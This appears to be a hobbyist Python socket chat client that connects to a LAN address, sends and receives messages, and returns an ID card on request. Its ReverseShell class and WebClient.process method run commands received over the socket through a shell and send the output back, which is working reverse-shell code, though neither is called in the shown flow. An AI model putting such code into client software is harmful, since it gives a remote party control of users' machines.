import socket
import time
import threading
import os
import subprocess
from Message import Messenger
import json 


CLIENT_EXIT_CODE = '--exit--'

class Status():

    def __init__(self, status):
        self.state = status

        if(isinstance(status, bool) == False):
            self.state = False

    def set_true(self):
        self.state = True

    def set_false(self):
        self.state = False

    def get(self):
        return self.state

class _id_setter():
    
    def __init__(self, object):
        self.object = object
    
    def name(self, val):
        self.object._name = val
    
    def id(self, val):
        self.object.identifier_token = val

    def expiry_date(self, data):
        self.object.expiration_date = data


class _id_getter():

    def __init__(self, object):
        self.object = object
        pass
    
    def name(self):
        return self.object._name
    
    def id(self):
        return self.object.identifier_token


class _ID():

    def __init__(self, id, name):
        self.identifier_token = id
        self._name = name
        self.expiration_date = None
        self.setter = _id_setter(object=self)
        self.getter = _id_getter(object=self)

    
    def attribute_category(self, cat):
        if(cat == 'getters'):
            return self.getter

        elif(cat == 'setters'):
            return self.setter
    
    def get_dict(self):
        _dict = {
            'ID':self.identifier_token,
            'NAME':self._name,
            'EXPIRATION_DATE':self.expiration_date
        }

        return _dict

class ComponentID():
    
    def __init__(self, id, name):
        self.ComponentID = _ID(id, name)
    
    def read(self):
        return self.ComponentID.attribute_category('getters')
    
    def write(self):
        return self.ComponentID.attribute_category('setters')

    def get_dict(self):
        return self.ComponentID.get_dict()

class PROTOCOL():

    def __init__(self):
        pass

    pass


class  ReverseShell():

    def __init__(self, connection):
        self.rev_shell_thread = None
        self.connection = connection

    def process(self):
        while True:
            data = self.connection.recieve_data()
            if data[:2] == 'cd':
                os.chdir(data[3:])

            if len(data) > 0:
                cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                output_byte = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_byte,"utf-8")
                currentWD = os.getcwd() + "> "
                self.connection.send_data(str.encode(output_str + currentWD))
                print(output_str)
    
    def __thread__(self):
        self.rev_shell_thread = threading.Thread(target=self.process)
        self.rev_shell_thread.start()

    def run(self):
        pass



class Connection():

    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.state = False
        self.remote_ip = None
        self.remote_port = None
        self.show_connection_error = True            #Connection error flag establish_with()
        self.connection_ready_for_use = False        #Makes sure connection is setup for use 

    def __reset_state_to__(self, val):
        self.state = val

    def establish_with(self, IP, PORT):
        try:
            print("Establishing connection....")
            self.socket.connect((IP, PORT))
            self.remote_ip = IP
            self.remote_port = PORT
            self.__reset_state_to__(True)
            self.connection_ready_for_use = True
            print("Connection established with ", self.remote_ip, self.remote_port)
            return True
        except Exception as error:
            if(self.show_connection_error): print("Failed!")
            else: print("Failed! [ERROR]:", error)
            self.__reset_state_to__(False)
            self.connection_ready_for_use = False
            return False
    
    def active(self):
        return self.state

    def send_data(self, data):
        if(self.connection_ready_for_use != True):
            print("[Error]: Connection not ready for sending...  Open() the conenction")
            return False
        
        try:
            self.socket.send(data.encode('utf-8'))
            return True
        except Exception as e:
            self.state = False
            self.connection_ready_for_use = False
            return False
    
    def recieve_data(self):
        if(self.connection_ready_for_use != True):
            print("[Error]: Connection not ready for recieving...  Open() the conenction")
            return False
        
        try:
            message = self.socket.recv(1024).decode('utf-8')
            if(message == ""):
                return False
            
            return message
        except Exception as e:
            self.state = False
            self.connection_ready_for_use = False
            return False

    def open(self):
        if(self.connection_ready_for_use == True):
            self.__reset_state_to__(True)
        
        else:
            self.__reset_state_to__(False)
        
    def close(self):
        self.connection_ready_for_use = False
        self.state = False
        self.socket.close()
    
    def local_machine_address(self):
        return self.socket.getsockname()
    
    def remote_server_address(self):
        return self.socket.getpeername()
    



class WebClient():

    def __init__(self, name):
        self.connection = Connection()
        self.local_address = None
        self.remote_address = None
        self.client_id = ComponentID('client_id', name)
        self.status = Status(False)
        self.messenger = Messenger()
        #self.shell = ReverseShell()


    def connect_to(self, IP, PORT):
        if(self.connection.establish_with(IP, PORT)):
            print("[Web Client] - " + self.client_id.read().name(), "is active and connected")
            self.remote_address = self.connection.remote_server_address()
            self.local_address = self.connection.local_machine_address()
            self.status.set_true()
        
        else:
            self.status.set_false()
            print("[Web Client - " + self.client_id.read().name(), "is NOT active and disconnected")
        return self

    def process(self, data):
        data = data[1:]
        if data[:2] == 'cd':
            os.chdir(data[3:])

        if len(data) > 0:
            cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            output_byte = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_byte,"utf-8")
            currentWD = os.getcwd() + ">"
            self.send_message(output_str + currentWD)
            #self.connection.send_data(str.encode(output_str + currentWD))
            #print(output_str)

    def __reciever__(self):

        while(True):
            val = self.recieve_message()
            if(val == False):
                self.status.set_false()
                self.connection.close()
                return
            
            
    def run(self):
        if(self.status.get() == False):
            print("In-active web client can't run")
            return
        
        self.connection.open()

        print("            Web Client   ")
        print("_____________________________________")
        print("Local Address:", self.local_address)
        print("Connected to:", self.remote_address)

        recv_thread = threading.Thread(target=self.__reciever__)
        recv_thread.start()
        
        val = None
        status = None
        while((self.connection.active() == True) and (self.status.get() == True)):
            val = input()
            if(val  == CLIENT_EXIT_CODE):
                self.status.set_false()
                self.connection.close()
                break
            
            status = self.send_message(val)
            if(status == False):
                self.status.set_false()
                self.connection.close()
                break

        print("           Web Client Closed")
        print("______________________________________")
        return self


    def send_message(self, message):
        #Need to detect if the socket on the other side has gone, offline or clsoed
        val = None
        if(self.connection.active() == True):

            # --- Sending message using messenger ----
            self.messenger.set_request_message(message)
            self.messenger.set_request_field('USERNAME', self.client_id.read().name())


            packed_msg = self.messenger.pack_request_body()
            val = self.connection.send_data(packed_msg)
            print("[YOU]: ", self.messenger.get_request_message())
            self.messenger.flush()
            # ---- End of the section ----------

        return val

    def __process_protocol_command(self, message):
        if(message == '--GET_IDENTITY_CARD--' ):
            _id = self.client_id.get_dict()
            sent = self.connection.send_data(json.dumps(_id))
            print("Sent ID CARD....")
            return True


    def recieve_message(self):
        #Need to detech if the socket on the other side has gone, offline or closed
        message = None
        if(self.connection.active()):
            message = self.connection.recieve_data()
        

        # ---- If there's any request as command/protocol
        _is_command = self.__process_protocol_command(message)
        if(_is_command):return
        # ------------------------------------------------------
        

        # --- Use messenger object to process data here in ----- 
        self.messenger.set_request_body(message)
        #self.messenger.unpack_request_body(message)
        username = self.messenger.get_request_field('USERNAME')
        timestamp = self.messenger.get_request_field('TIME_STAMP')
        print("{}:".format(username), self.messenger.get_request_message())
        self.messenger.flush()
        # ------------------- End of section ------------------
        return message

    def close(self):
        self.status.set_false()
        self.connection.close()

    def get_card(self):
        return self.client_id


client = WebClient('Elijah')
client.connect_to('192.168.1.140', 9999).run()
print("Name:", client.get_card().read().name())
client.close()